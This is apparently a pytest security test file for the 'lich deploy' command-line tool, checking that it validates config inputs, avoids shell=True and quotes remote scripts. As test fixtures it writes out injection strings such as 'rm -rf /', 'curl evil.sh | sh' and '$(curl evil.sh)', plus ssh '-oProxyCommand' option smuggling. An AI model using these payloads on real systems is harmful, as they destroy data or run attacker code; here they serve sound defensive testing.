"""Security tests for lich deploy: no shell=True, validated inputs, quoted scripts."""
import subprocess
import pytest
import yaml
from typer.testing import CliRunner
from pathlib import Path

from lich.cli import app


class TestVerifyGithubAccess:
    def test_uses_list_command_not_shell(self, monkeypatch):
        """A hostile key_path must be passed as a literal argument, never through a shell."""
        captured = {}

        def fake_run(cmd, **kwargs):
            captured["cmd"] = cmd
            captured["kwargs"] = kwargs

            class Result:
                returncode = 1
                stdout = ""
                stderr = "Hi acme! You've successfully authenticated"

            return Result()

        monkeypatch.setattr("lich.commands.deploy.subprocess.run", fake_run)
        from lich.commands.deploy import _verify_github_access

        hostile_key = '/tmp/key"; touch /tmp/lich_pwned #'
        result = _verify_github_access("git@github.com:acme/app.git", hostile_key)

        assert isinstance(captured["cmd"], list), "command must be an argument list"
        assert captured["kwargs"].get("shell") is not True, "shell=True is forbidden"
        assert hostile_key in captured["cmd"], "key path must be a literal list element"
        assert result is True

    def test_detects_failed_auth(self, monkeypatch):
        def fake_run(cmd, **kwargs):
            class Result:
                returncode = 255
                stdout = ""
                stderr = "git@github.com: Permission denied (publickey)."

            return Result()

        monkeypatch.setattr("lich.commands.deploy.subprocess.run", fake_run)
        from lich.commands.deploy import _verify_github_access

        assert _verify_github_access("git@github.com:acme/app.git", "/tmp/key") is False


def _write_deploy_config(project_dir: Path, path_value: str, git_repo: str = "git@github.com:acme/app.git"):
    lich_dir = project_dir / ".lich"
    lich_dir.mkdir(exist_ok=True)
    config = {
        "production": {
            "connection": "manual",
            "host": "192.0.2.10",
            "user": "root",
            "path": path_value,
            "runtime": "docker-compose",
        },
        "git_repo": git_repo,
    }
    (lich_dir / "deploy.yml").write_text(yaml.dump(config))


class TestDeployConfigValidation:
    def test_deploy_init_rejects_malicious_path(self, runner: CliRunner, temp_dir: Path, monkeypatch):
        monkeypatch.chdir(temp_dir)
        (temp_dir / "backend").mkdir()
        _write_deploy_config(temp_dir, '/opt/app"; rm -rf / #')

        result = runner.invoke(app, ["deploy", "init", "production"])
        assert result.exit_code == 1
        assert "Invalid" in result.output

    def test_deploy_init_rejects_malicious_git_url(self, runner: CliRunner, temp_dir: Path, monkeypatch):
        monkeypatch.chdir(temp_dir)
        (temp_dir / "backend").mkdir()
        _write_deploy_config(temp_dir, "/opt/app", git_repo="git@github.com:a/b.git && curl evil.sh | sh")

        result = runner.invoke(app, ["deploy", "init", "production"])
        assert result.exit_code == 1
        assert "Invalid" in result.output

    def test_deploy_prod_rejects_malicious_version(self, runner: CliRunner, temp_dir: Path, monkeypatch):
        monkeypatch.chdir(temp_dir)
        (temp_dir / "backend").mkdir()
        _write_deploy_config(temp_dir, "/opt/app")

        result = runner.invoke(
            app,
            ["deploy", "prod", "backend", "--force", "--version", "v1; rm -rf /"],
        )
        assert result.exit_code == 1
        assert "Invalid" in result.output

    def test_deploy_prod_rejects_malicious_config_path(self, runner: CliRunner, temp_dir: Path, monkeypatch):
        monkeypatch.chdir(temp_dir)
        (temp_dir / "backend").mkdir()
        _write_deploy_config(temp_dir, "$(curl evil.sh)")

        result = runner.invoke(app, ["deploy", "prod", "backend", "--force"])
        assert result.exit_code == 1
        assert "Invalid" in result.output


import os


def _write_ssh_config_deploy(project_dir: Path, ssh_name: str, deploy_key_path: str = None):
    """Write a deploy.yml using the ssh-config connection branch."""
    lich_dir = project_dir / ".lich"
    lich_dir.mkdir(exist_ok=True)
    production = {
        "connection": "ssh-config",
        "ssh_name": ssh_name,
        "path": "/opt/app",
        "runtime": "docker-compose",
    }
    config = {
        "production": production,
        "git_repo": "git@github.com:acme/app.git",
    }
    if deploy_key_path is not None:
        config["private_repo"] = True
        config["deploy_key_path"] = deploy_key_path
    (lich_dir / "deploy.yml").write_text(yaml.dump(config))


class TestDeploySSHDestinationValidation:
    def test_deploy_init_rejects_option_smuggling_ssh_name(self, runner: CliRunner, temp_dir: Path, monkeypatch):
        monkeypatch.chdir(temp_dir)
        (temp_dir / "backend").mkdir()
        marker = temp_dir / "lich_pwned"
        _write_ssh_config_deploy(temp_dir, f"-oProxyCommand=touch {marker}")

        result = runner.invoke(app, ["deploy", "init", "production"])
        assert result.exit_code == 1
        assert "Invalid" in result.output
        assert not marker.exists()

    def test_deploy_rejects_dashed_key_path(self, runner: CliRunner, temp_dir: Path, monkeypatch):
        monkeypatch.chdir(temp_dir)
        (temp_dir / "backend").mkdir()
        _write_ssh_config_deploy(temp_dir, "myserver", deploy_key_path="-oProxyCommand=evil")

        # Reach the deploy-key setup step: pretend the server is reachable and
        # skip Docker so the dashed key_path guard is exercised before any scp.
        monkeypatch.setattr("lich.commands.deploy._check_ssh_connection", lambda host: True)

        def _fake_scp_fail(*args, **kwargs):
            raise AssertionError("scp must not be invoked with a dashed key_path")

        monkeypatch.setattr("lich.commands.deploy.subprocess.run", _fake_scp_fail)

        result = runner.invoke(app, ["deploy", "init", "production", "--skip-docker"])
        assert result.exit_code == 1
        assert "Invalid" in result.output


class TestRemoteScriptQuoting:
    def test_clone_cmd_quotes_path_and_repo(self):
        from lich.commands.deploy import _build_clone_cmd

        cmd = _build_clone_cmd('/opt/app"; rm -rf / #', "git@github.com:acme/app.git")
        # the hostile path must appear only inside single quotes
        assert '\'/opt/app"; rm -rf / #\'' in cmd
        # and never unquoted
        assert 'mkdir -p /opt/app";' not in cmd

    def test_run_ssh_command_delegates_to_shell_module(self, monkeypatch):
        captured = {}

        def fake_run_remote(ssh_host, script, timeout=120, capture=True):
            captured["ssh_host"] = ssh_host
            captured["script"] = script
            return 0, "ok"

        monkeypatch.setattr("lich.commands.deploy.run_remote", fake_run_remote)
        from lich.commands.deploy import _run_ssh_command

        code, output = _run_ssh_command("prod", "echo ok")
        assert code == 0
        assert captured["ssh_host"] == "prod"


class TestVerifyGithubAccessTimeout:
    def test_returns_false_on_timeout(self, monkeypatch):
        """_verify_github_access must return False (not raise) when SSH hangs."""

        def fake_run(cmd, **kwargs):
            raise subprocess.TimeoutExpired("ssh", 15)

        monkeypatch.setattr("lich.commands.deploy.subprocess.run", fake_run)
        from lich.commands.deploy import _verify_github_access

        result = _verify_github_access("git@github.com:acme/app.git", "/tmp/key")
        assert result is False, "TimeoutExpired must be caught and return False, not propagate"
